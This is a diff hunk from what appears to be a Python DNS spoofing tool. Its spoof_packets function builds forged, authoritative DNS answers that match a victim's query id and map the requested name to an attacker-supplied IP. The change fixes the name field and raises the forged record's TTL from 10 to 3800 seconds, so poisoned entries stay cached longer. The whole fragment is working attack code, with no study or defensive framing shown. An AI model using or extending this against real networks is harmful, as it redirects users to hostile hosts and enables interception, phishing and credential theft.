@@ -24,7 +24,7 @@ def process_args() -> Tuple[str, str, str]:
 def spoof_packets(packet, spoof_ip: str) -> None:
     ip = IP(dst=packet[IP].src, src=packet[IP].dst)
     udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
-    rr = DNSRR(rrname=packet[DNS].qd.name, ttl=10, rdata=spoof_ip)
+    rr = DNSRR(rrname=packet[DNS].qd.qname, ttl=3800, rdata=spoof_ip)
     dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=rr)
     pkt = ip / udp / dns
     try:
